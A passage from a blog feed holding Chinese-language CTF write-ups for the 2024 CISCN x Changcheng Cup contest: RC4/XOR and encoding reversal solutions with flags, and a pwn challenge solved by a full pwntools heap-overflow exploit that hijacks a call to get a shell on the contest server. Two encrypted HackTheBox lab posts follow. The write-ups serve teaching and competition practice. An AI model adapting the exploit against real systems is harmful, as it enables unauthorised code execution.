id="ezCsky">ezCsky</h2><p>题目提示使用了国产的交叉编译链对tbox的固件程序进行了编译，ida直接反编译的话会有一个异架构异常，网上搜一下，找到一篇<a href="https://www.iotsec-zone.com/article/379">参考文章</a>，然后直接用arm小端反编译，还是很难看</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216091736250-732638104.png" alt="image-20241216091725499"></p><p>但是基本的加密逻辑能大概看出来，有RC4有异或unk_8AA0</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216091741237-1476403439.png" alt="image-20241216091730600"></p><p>没办法调，这块儿fuzz了好久，密文肯定是无脑存unk_8AA0的，key是&quot;testkey&quot;，肯定是用于RC4的key是没得跑的，但是不知道有没有用这个还有异或的逻辑，后面一步步fuzz的，先解RC4再解xor，先xor再RC4，然后试探xor的逻辑选取常见的那几种，要不就是对上面的key的模取异或，要不就是经典的前一个等于前一个异或后一个，然后逆回去，最后fuzz了很久（雾）。。。。</p><p>最终的逆向逻辑是先无魔改RC4，然后走一个前后异或（从最后一个异或回去即可）</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216091747672-740300043.png" alt="image-20241216091736652"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">key=<span class="string">&quot;testkey&quot;</span></span><br><span class="line"></span><br><span class="line">data=[<span class="number">0x0a</span>,<span class="number">0x0d</span>,<span class="number">0x06</span>,<span class="number">0x1c</span>,<span class="number">0x1f</span>,<span class="number">0x54</span>,<span class="number">0x56</span>,<span class="number">0x53</span>,<span class="number">0x57</span>,<span class="number">0x51</span>,<span class="number">0x00</span>,<span class="number">0x03</span>,<span class="number">0x1d</span>,<span class="number">0x14</span>,<span class="number">0x58</span>,<span class="number">0x56</span>,<span class="number">0x03</span>,<span class="number">0x19</span>,<span class="number">0x1c</span>,<span class="number">0x00</span>,<span class="number">0x54</span>,<span class="number">0x03</span>,<span class="number">0x4b</span>,<span class="number">0x14</span>,<span class="number">0x58</span>,<span class="number">0x07</span>,<span class="number">0x02</span>,<span class="number">0x49</span>,<span class="number">0x4c</span>,<span class="number">0x02</span>,<span class="number">0x07</span>,<span class="number">0x01</span>,<span class="number">0x51</span>,<span class="number">0x0c</span>,<span class="number">0x08</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x00</span>,<span class="number">0x03</span>,<span class="number">0x00</span>,<span class="number">0x4f</span>,<span class="number">0x7d</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># for k in range(len(data)):</span></span><br><span class="line"><span class="comment">#     data[k]=data[k]^key[k%7]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)-<span class="number">1</span>,<span class="number">0</span>,-<span class="number">1</span>):</span><br><span class="line">    data[i-<span class="number">1</span>]^=data[i]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(data[j]),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p><code>flag&#123;d0f5b330-9a74-11ef-9afd-acde48001122&#125;</code></p><h2 id="dump">dump</h2><p>（最可惜的一题，拿到附件测了两下就知道可以黑盒fuzz了，不是00情况多种的话，我手爆感觉能有血，呜呜呜），先拉到ida大概看了一下，属于是又臭又长，但是看见有命令行里的传参</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216091821240-2041104139.png" alt="image-20241216091810486"></p><p>就测了两下，对照密文</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216091831890-1363112404.png" alt="image-20241216091821052"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216091837256-2095190718.png" alt="image-20241216091826661"></p><p>脑神经寻思紧绷，直接测所有可见字符就好了，奈何测上道题给我榨干了，爆破脚本不太会搓了，直接手撕，给所有可见字符编一下码，接下来就是体力活儿了</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216091844450-1976891504.png" alt="image-20241216091833780"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x00</span> <span class="number">0x1C</span> <span class="number">0x1D</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x02</span> <span class="number">0x03</span> <span class="number">0x04</span> <span class="number">0x05</span> <span class="number">0x06</span> <span class="number">0x07</span> <span class="number">0x08</span> <span class="number">0x09</span> <span class="number">0x0A</span> <span class="number">0x0B</span> <span class="number">0x0C</span> <span class="number">0x0D</span> <span class="number">0x0E</span> <span class="number">0x0F</span> <span class="number">0x10</span> <span class="number">0x11</span> <span class="number">0x12</span> <span class="number">0x13</span> <span class="number">0x14</span> <span class="number">0x15</span> <span class="number">0x16</span> <span class="number">0x17</span> <span class="number">0x18</span> <span class="number">0x19</span> <span class="number">0x1A</span> <span class="number">0x1B</span> <span class="number">0x00</span> <span class="number">0x1E</span> <span class="number">0x1F</span> <span class="number">0x20</span> <span class="number">0x21</span> <span class="number">0x22</span> <span class="number">0x23</span> <span class="number">0x24</span> <span class="number">0x25</span> <span class="number">0x26</span> <span class="number">0x27</span> <span class="number">0x28</span> <span class="number">0x29</span> <span class="number">0x2A</span> <span class="number">0x2B</span> <span class="number">0x2C</span> <span class="number">0x2D</span> <span class="number">0x2E</span> <span class="number">0x2F</span> <span class="number">0x30</span> <span class="number">0x31</span> <span class="number">0x32</span> <span class="number">0x33</span> <span class="number">0x34</span> <span class="number">0x35</span> <span class="number">0x36</span> <span class="number">0x37</span> <span class="number">0x38</span> <span class="number">0x39</span> <span class="number">0x00</span></span><br><span class="line"></span><br><span class="line">flag&#123;MTczMDc?MzQ2Ng==&#125;</span><br><span class="line"><span class="comment">#上段中？部分不知道00的对应内容，最后在平台一个个试的最后结果是4（试出来之后不一会儿就给提示说是4了（乐））</span></span><br><span class="line">ABCDEFGHIJKL M NOPQRS T UVWXYZ</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">02030405060708090a0b0c0d0e0f101112131415161718191a1b</span><br><span class="line">A B C D E F G H I J K L M N O P Q R S T U V W X Y Z</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1e1f202122232425262728292a2b2c2d</span><br><span class="line">a b c d e f g h i j k l m n o p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">23</span> <span class="number">29</span> 1E <span class="number">24</span> <span class="number">38</span> 0E <span class="number">15</span> <span class="number">20</span> <span class="number">37</span> 0E 05 <span class="number">20</span> <span class="number">00</span> 0E <span class="number">37</span> <span class="number">12</span> 1D 0F <span class="number">24</span> 01 01 <span class="number">39</span></span><br><span class="line"></span><br><span class="line">23291e24380e1520370e0520000e3712 1d 0f <span class="number">24</span> 01 01 <span class="number">39</span></span><br><span class="line"><span class="number">23</span> <span class="number">29</span> 1e <span class="number">24</span> <span class="number">38</span> 0e <span class="number">15</span> <span class="number">20</span> <span class="number">37</span> 0e 05 <span class="number">20</span> <span class="number">00</span> 0e <span class="number">37</span> <span class="number">12</span> 1d 0f <span class="number">24</span> 01 01 <span class="number">39</span></span><br><span class="line"></span><br><span class="line"><span class="number">23</span> <span class="number">29</span> 1e <span class="number">24</span> <span class="number">38</span> 0e <span class="number">15</span> <span class="number">20</span> <span class="number">37</span> 0e 05 <span class="number">20</span> 1c 0e <span class="number">37</span> <span class="number">12</span> 1d 0f <span class="number">24</span> 01 01 <span class="number">39</span></span><br><span class="line"></span><br><span class="line">1c1d000000000000000000000100000002030405060708090a0b0c0d0e0f</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>flag&#123;MTczMDc4MzQ2Ng==&#125;</code></p><h1>PWN</h1><h2 id="anote">anote</h2><p>ida反编译不是给人看的，直接鸡爪启动，有add,show,edit三个功能，edit有堆溢出，可以读入40个字节，show会给出堆块的地址，并且有后门，edit可以输入负数，也就是说可以越界，并且有个call rax,根据偏移写入堆块地址，堆块中写入后门，getshell</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216091924480-1952953316.png" alt="image-20241216091913531"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216091934966-125092182.png" alt="image-20241216091924255"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216091939379-879390541.png" alt="image-20241216091928723"></p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&quot;39.105.123.22&quot;</span>,<span class="number">30938</span>)</span><br><span class="line"></span><br><span class="line">backdoor=<span class="number">0x080489CE</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>():</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Choice&gt;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Choice&gt;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;index:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">k,size,fenshu</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Choice&gt;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;index:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(k))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;len:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;content:&quot;</span>)</span><br><span class="line">    io.sendline(fenshu)</span><br><span class="line"></span><br><span class="line">add()</span><br><span class="line">add()</span><br><span class="line">add()</span><br><span class="line">show()</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">heap_addr=<span class="built_in">int</span>(io.recv(<span class="number">7</span>),<span class="number">16</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x28</span>,p32(heap_addr-<span class="number">37000</span>)+p32(<span class="number">0</span>)*<span class="number">4</span>+p32(<span class="number">0x21</span>)+p32(backdoor))</span><br><span class="line">edit(-<span class="number">8</span>,<span class="number">0x28</span>,p32(heap_addr+<span class="number">32</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216091958877-230897655.png" alt="image-20241216091947749"></p><p><code>flag&#123;7c66ca9e-6fdb-4ea1-8c91-e759ae505e87&#125;</code></p>]]></content>
    
    
    <summary type="html">2024 CISCN x 长城杯铁人三项 初赛 WriteUp By Rweboy</summary>
    
    
    
    <category term="Writeup" scheme="https://ya1orin.github.io/categories/Writeup/"/>
    
    
    <category term="CTF" scheme="https://ya1orin.github.io/tags/CTF/"/>
    
    <category term="Competition" scheme="https://ya1orin.github.io/tags/Competition/"/>
    
  </entry>
  
  <entry>
    <title>HTB-Pro-Labs-RastaLabs</title>
    <link href="https://ya1orin.github.io/posts/71305da9.html"/>
    <id>https://ya1orin.github.io/posts/71305da9.html</id>
    <published>2024-11-20T03:20:44.000Z</published>
    <updated>2024-11-26T09:42:30.983Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="8ae2dca83857c499ab6f1d5789d63d44693d665e057fc282e24df6b17c8fc44a"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">内容还没写完，需要密码才能查看！</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">HackTheBox篇ProLabs系列之RastaLabs</summary>
    
    
    
    <category term="HackTheBox" scheme="https://ya1orin.github.io/categories/HackTheBox/"/>
    
    
    <category term="HTB" scheme="https://ya1orin.github.io/tags/HTB/"/>
    
    <category term="Windows" scheme="https://ya1orin.github.io/tags/Windows/"/>
    
    <category term="Active Directory" scheme="https://ya1orin.github.io/tags/Active-Directory/"/>
    
    <category term="ProLabs" scheme="https://ya1orin.github.io/tags/ProLabs/"/>
    
  </entry>
  
  <entry>
    <title>HTB-Pro-Labs-Zephyr</title>
    <link href="https://ya1orin.github.io/posts/3130f160.html"/>
    <id>https://ya1orin.github.io/posts/3130f160.html</id>
    <published>2024-11-15T12:33:33.000Z</published>
    <updated>2024-11-26T09:42:30.987Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="b2ba86c01fedc708030e7361fe74376c193a73e716fe7d27f1e9e6396a32c30e">429d2b0d4691de95039ce37423d829a1e32ef970391709b7a04b59ff68e25ead3923a90a03cc0dd1cb5605259fdaf50f15b1404e9e25af1d5ddc88d1ae52df79beac48821be3257ab1452b924f52927c88d1a703d90030a8dc3ac853d472adf748ec16d8110624ed3dc193117dc39e9ecb1ccb42e30c7bc9d0fa3a474eab59ec0108fbffbac99df0d0a86d6e1bfa9634259413bf0ec5c726e88b6f82bb10bc737ce9f8c660259bdd80effb07bd8ef3bf5218ed281172f05d24f1037e192bc8a72c9b3b74025f88f66a7350424e7ce572c5b4df1ec4df5aa6625d3d03f8bd966ec75274d2181df97213bf515df796692d9002a1fb74b561bdedd89df89db5280a08fd182c662a4856ed4b3cfabe3c28ed3dd8c631b144953ff06134ca12ef70e4f27b9111d354d48c2a3b44f6d166f5ab7e7a26bf3709fd70a17c9d8413c29f146ef29ab302644d006935db89bab7e37c0662234d5a7fdee2414bd9fe46b3d3c5f9b557df9aa449fefbb5d1372c90771c8a857e9e69886d811314605da66f46ded6d90e67cecb288c867f9001cb6745298fc5b2cbdcd8d318772b7f75c54244b2591d9939021b8127a33d1ac5b6ee1066d35f5cb888ab70801682b117ad471bf38827ea2e6ccfdbbded03895d0c4e774d7521bd979c92d58ccbce338f7eaa5441cd73841af9f7580f906d1778bd43f7964f7c48948d59cfd8d5dca28ec6bc5b65cda8ed7785c948cfb71772a4fa38b14a0f76574ce80a37c087c017a680b23667420f8cb8d0f3cf596cb6578798b587e2d23912e07fb2399f1abc43a621e226d0879129e1763fab39d629708b36203e67c0aee7728a9ffd5621268370dcf8f2c5a071c62e381f7bde24df57a247ca5873d0c4d207379de21ecbdb71548b88dc131200d1051d0be67b129dcc30b73ebb702adf5279ba15a7c367b14dbfe3c787af864c6389932fbdd1f209ed71d99340aa5df6ebc1e65931b5f9b8250d3d16591d4552507d48ce49eb4d12279518d2cce83f33ed819f935b1080922417f65522fd3bdaef6e61a464c5243a76a7ba3386264f663fc83ba1491ac0b8fb9ba98382ab1ecbc7212463db8027c4053554682c7cd04222f6dbd4b3fbd2546f0a0d2cffddc46f382146a421ca2c1fa66b1b156b388407e03290d77c1230539251587c054fd5c6e7ee347cc70d0d4ba60b38a1d2c0b452777f20d6784182af19cbb5522dbfa34ba3749f81706dcbaa2f5d66df38c2ece73b27e4b21b613698068c060309fef0ceefde0e1491d379b4382cedd6ceb447da9331e3674f20ab20172fcac33e918cc2ee38728596b8756657a59571baa78a87d2c8493c7cff0476fa8187acbc2e984d4c35031f3a5c9911180c48bccbdbb8c7f79ef564a879b366f9345157ddd32c58546629e23cd70d6dc6af3ce87178ce264a644755b1d88a8b420c2d48dd8210585974246f459d1f03e624b4d4fa187d3b8005bbe4534f6e34f7431d0ac9dbc7f99ec60cdad0b194de40dfd535ba2e08f147d9f19ae0e87a635fde99c0e5cbb53117dbeb07eb2dbda6da8b874ef9997522c2be1f41d7d5c7e610e70d3f3e388f42653397635f53cb5eea0cda04234a98ee3e417ac9f4e89cc673c9b093a96045ca8602bc213ca490ca79eeb6c4a628c06c3b4720a0909e29f7f1277c5617ec4621a43d4efd7414f0963831942a06725f0d30403e02e28995bc54fd43d1e8f7ac81ca4e7e4bb56fa95e4e900bffb1a1d311937186dc88809aa91a8aad06e43a769e7470738ab3fe8d2d0f3e01cc5d7f5a825ecd7b4bb1ac7c4883db7b1b1a6e21833c4449ad51ff85b649f464caaca5b4901a1f3e79a0cf715f1013b9606f02f7d57e5dcec95812efc12a9e79b73f14f92b9e9dbdbc425b80529a3554a823918c5cfcd2da0a2a5e2f392970c6462f81c2ac568e4f7269745424bdb8a786a816396df4973d2de7716b3ed46d056ebd5e142592fb67a54c71775f68e7694a995c1ee6da486f70030daa3f22114051f118e52160eb0f73348670bf7a3df5e691f3dc85faafb9f9f975a673e3d8b5f90417d4b977e05d0904906d6396eff3553d7675a6167b3326d2d7e8714dddc6c7a3a0dbe725f759bae62b189c73a6204d445c43ff8c27593eaf0a20163f5232c7a269b607ac4cfa1a6dce1b82fe3190be806ff00d3457b5c4fa45d96b490407309e8c176dba4a380b541c831cdc3b58dcbc59f7f382458051164187c2759639fa21d5486b0627fd8306608811b2b997a28b85550077405886f0b6457eacd371670d6701dd099b202e4a7fabf4994533bd6e54d933ad38543aa9d994788474163f53bfa77d0fe49bf20e623dd03db2a4f4de0b48d5e431b9c921102b075d90f103df578d933a3be9b96df60ba40a3ce5fc03d44117d71e7bd1ed5177bfb63462a731c3193f6fe7bec5994a785bafdca9f393d65d4f77382296798ef2b2d04599057f3d64e5bb5d06a789bdda3a0c0447471890be42cc768a74e58544c834b4699fa169614406b53a525cc5b55e3345fc6aaed14adc30027c235341bc77d568296af90c678cc924198cbe91f3865c737729d3bba6d937f34ec543e54c81232bf74c34c1bdc1c2a34ec80a9011ba437f5f00e4be0ab60fcea13afe1058ba9ced3a85698feecac3db1fd85657786f51d29927da206b348d45d383b637e4a539ada7537c5f782623c35c0e72cff1dd497b00b89d02b897fd9c366fff73993e9fb2cf5fda69ab2a135c984baf26133d2590b965ff4efd67d71b3d1f30d774764feda0f63f562cf255b06fb6a35472f215fc2f92a3bc99d02535a7f240f212336ec45337b3c0582f6c738c04b334821fea12a3071c02068dca234cbc9f958ff8f80ff0159182bbdc245bab79d4758b118cc6ab7daa5352ea54facd67f144cda100b596fc178c0cc556547989ab2b44e13576e7f1d6d916562c65bfec301d9c344c0e07e773a539a54784de341ed1ce669d18dc0c5695813a73c4422ab0d8cd082b404a621c8e4dcfb114c5c26e31411f97db9f746ac1a2a43bf9bfb8fbed4b59b0793155662ad7ae0b23654a3cb884b5ffa00fc8d4db58d2454b2c9f43dc50300ac5dab71caf96f435f4f6aff6b3e69837f75c665751c8b92b6d5d008d22ba62537c82725e4e6b437f48a01679d392847ebc0eab2e0315c948d9aae733e0a81dfe9398e410c11eaeecc37ddd3ea225477e46d59456759c16706666a84f2869b0cb20a08e8c2c0b8efc14445e136d4d1cf1f8df5b080de6c8a6a1b0b7e64426fc3d2c88dccd96ca0eee9934f8d44718fb2d79b584bbfe0b12622d5720f18647f76f49b9d4285e394b529953a9a1e3dacf83072bad9211b341cd4dc48955dc37674665ee418e322074e6125693653118db7cdc3d0710866f2cc95f3743b33fbf0b325a056929a99ff5186505534af506179d36e939fa417c61126ddcd492cf09176bcee66e301fe2a9a35b27463da12ce154d7538579c0a945f6ec277e69aee231d3b0581ce67ada40d33fcc833711e85f7177ffea49ce11b2e6d59371766a9f46445cba70a6a3d96b3c31a382740eccdeda58a87e8229128371eceffa866cb7ea79dd4738a6859a2286ef18c0a14589481978c83cd2ab8f56ff583b5d37ed10827eafc36c920a5e1f1fe26acf06efb010dec28e94a5a1fb5f1a547de078913c073ff902c910881d3063889457f9f51e5332f2f77ae8c9f9198d310cd4a69746be5cc23c06436d3d5e2e447d8ce0bae6c95ff5fce789b8b9e5c9a4d4e76585599261e563091bcf644910fd4e152e3d920a7f3dbea638d43df5157084675089171228573976927c84bb3e11834dfa2c74d996aecda3b3451d4a6ea70433d087a9237ab6ee812fbad9459619b48b2df0ec02655d487ef2c2e7754a2776a928ab94ebc6ced623ee76a3f69269e00f67bafd6845dd48200f33bb4df2392fe14490d66e9d63604e1e41983989a196ec19f436e82999a6b0370cdbf2a5add1f25a4b77c14e05338d019a09400d9e6fb3ace0d7cee8bfe542b7479d11f4adb3b0c5cdd0395f4fdab2170ec03ef8e8796972e4b82851d790d3aaf00f5d3f30967c08edc03d2c092fb2e3c7c5a6424141288a5154615c7b503ac26cf5a4c3e6bba732f3b6d729389ce183d9e4cb481464e3a01f46ebf1f4f4926230d90233aec9fa610d4d68553b9d7c2a47b39abcbe05e286e00d41076ef24fb015df82ff6ea29794b3d1623a94562237a002f52ea25242d6c7adb31d2a96e8699a6e96645318dc1b63d9a16d0a3cdbedeada47475b257b39762cc518b2c3d7f4ce8cdb8fcadb516d264365e707a5e62fc7af37f87d7985088f5eecb31b4ebcb247a582ff451bbd8f0dbdcb24a75f958e95a1c951185063c7df2fa52814d134389f6a48f56e1a1509a117f39fbd9dafeb44b3a6a07bbae520b3dd0195e47478093378f0c54fcfdd2ff72819b2156e1654cce6846197271b70bb896a205643ab85f46d31dae24779ce9df30d8242711feaea086c7f2d9f179a09399dbae0baac010f7fac07dc975919b53c7caedcbae2d88d6f5feb61b7c3c3cc2412432b790623ba5a904ead99e0ea88c6657434fce85f5ebbcd6669c7f0c43096c84d90cc2c5bfb12c20c2926b369d2819cb468940a686ab1e42011bf762e7ac8e2664b5778f8b9cb3ecc0c1f8e4948fb330e7c116aa835ab9af0f6315f538fe2fdd0fcf9b8f9db33a5a6c7baf1103a0124b5ee34a945b565fcbc3edae4684be7e9ca4860d4f5964edf829bf3744effe15572096fa64e6e8c4480f5f7702532922b979fd05c6eaea2fbaed670430d9a3b869f87263bfa04102c29545712b917f564b586a32cff43eb9be12f7cfd0b84eec251dbb537fb04552f68cf3cf6542a5f775d141364a28544efab612cb1b6114c8870e3e21f28aeacb009bc3ae825e1ee9c6ee0fdf78216ef10ccfdf6e4e256ba091e58009b340859cf2dd4ce142e58b4f04e2b1f88a721a74250835d9efaed9e24fefd6137be01de680ff2233111d192a0a0fa7d2802137e4b8f44d602fb7bd53266df6b643666aebb98281602245234d4dd0c381efe80e81cb8e8c7ecaa8ec3672b1ab105e7c87431f47143bebed5b0b92d767014aa1cdc8c28a9a08e0a123a7fda6d6967d34dc9b960f6b3b99201e9386984846ccbc68747d148e23c5be7d5396959f5a220351e1ad24e0d718fbe9d0ca0984466a21d5df09735622885eea61e726576affa2b1a385002150c794c8ab12fcf8a91894e133791c386a6012e284629ba252afde041c2ee58abbadb0ccfd6b8f547e1be5fcec79f3343a8576026fee7e7a85ba78520d7e98d1b435424132d93080828da19fcfdc8f5af6951c2aac8ffef51defed4d546c2793d636e91a7f10e73a20b9aa53aa1d533d7b820c63a40c92235dc9a8f93a705108e598c834b9df15bd94e2f71bdbebd1754a2b1844efd2408211f0a7121ab88ee90fc5906ce600c0528fb54c877d39212639f939cf002904a9f87d1233e95c259def9e85df2cd206fa37bc40a573022a13300981e06369fc300dac1cc8f30f777af8e591a3886580d0aba1e92f8f46375a083e969687f60e7c509f66eb0dcd7ae4b5e5631dbdd02569c00a6d754f6462c3847dc1f0329823ac20ce92e5621c5a92fad54d0a80aa238d71edb5c50b88c292883ddcb155d2799a86074697e3c318ae387a25234f9b793cb81b54b05ab04d9f4cfa1bba95681d90944ae88fae5620b5a7f5fe171510c35aa76ac9f8fa296e8cca363a29f9d43bbae483411c56145dfd02525b8508a7dc0143d1ade2ab2c16475fcffbf9e4b74a62b2f13b281b2ab7b2323318aeb5fd97f007033eb3fb573e1567c07a05b4b6749d95fff5723d3fa78c510fa3842f755e21af27cb5127c2c7f34da86ae558f4b6629fe28a523aafc0bd44a735607afa278c35f13fa93fc96cc99d33426357a3e7bebf24ec830f56bca6059161813dc09ac5901fc39de07fc8aa08407fe4cc1b3cd841eb10f33f07af29b8d86ac2f37493767f399e0b7bba1e4bd2867c813cf46db3935801f07ae171f69b32326cbacb13c1b4d2ebc4ac44589869d78c1704f9081d471aeb10b443a5b1d82fac3e51002fdc8cec067c2b50711ecc0d621c18cf0496b36ce6d811e5ee6f705d2d51b40db78515c4ae1001ef0d3de764e683939b6e0c4c4b5542f1b4b1c0112e638c39988fb036d5bf9f00b80a3974f1b3b4a5f8a376da01523a6151d6c80ebbb467ebc377288e771a82126f81eb17ac120b0ad94606851e749c0db1814419d42708f35a93ada3135ce3e8e60b6f7ebdd307a251baaccdea7092dff38ca6e91fab53d0fa9f7920b08575f6d17e6b09ea86ae276c14d0f5da7e6beb1bc74a746bea7d7347fde0ecafbd2b24afc177a10eaa0e67d9f945d5e15a180fdf8674dec885ca320078243ec7648f58212deba754aba57dabb89cdac5d6dc4c4e46986d262aad623a914a2e74e117fe52e4f705fc5f1b864fdc1e77fc17f2d71f7b6b75e6defcea29849230f5d8d4c2d274eafa721dfae50e9bbb8dbec261f03312db903063b777e61db02c50851237b5c2dde868c358412f343fe6977f8aa29be41ab5c3901566f613ea11d66a0db35b6e6dba2c5db38017316b0daebbe42bc2ab3d658529c59a6046ae5e3d05d491afe87ffe29adb18298a7a64342342c6bd6d0910038a94f3d02926111a47204c194ddb2756fd6ed6e7baa44701c53d13c5c660e25a513abd1477af3b630109499d91a7235bded506920bdf3f62532b78e942350067045d71c581ede6fd00dc47a58acdcd2f3c31742e6919394171321f8e16ab68d8f19f51cdfeff8e4eb8a61bb03c55131b1501a068e4a46f216a17b03e28b4b72cc5ef7dc7b8623d1b05048425981b08310a2cd062a1118a3b42f43ac4db02c185383e64f94889ec0d69f7424a5b030af032e3a6d636e6394a7ff63003702c726e359a3b775c0612ab310404671117c214b6e4400fdde49fbfefdf713e2d941cf11186e236906400afb910a5a8f814d1b2192bfe7852fa7b3028fa39e8ca39b606f719dbc4885cb33bf432a33f624062b830b540cfa8c807de2f19ba84d73917a915d2499e389ad79bbd8fc6f6c91599b6cbeb6ecec7e1dfc6214b736428c81507e527a62ec6cd464b08cc75d498215795e9655cd790a5e6192d3ab7bbb22d7c313b232348ddb2dcfe493aa5a4d22e335ccc1919f021f6b5d5ca9efc290e08d38d46eb4a5b3004cfc5f90583bde7ba96146b529e1f885999acb2c2c5c57f983cee3bf21480d6613233e2f59c310ed9c1dbcfc60bfc6e105c0757194d0a1039d56ba8647222fa6943116dcea2ad7df00b204a463d7066203faa5ab30fd03913f89e02fb1fcbb7773cc4a9e800e9dd4fbf6ebe4c8f6a659c96b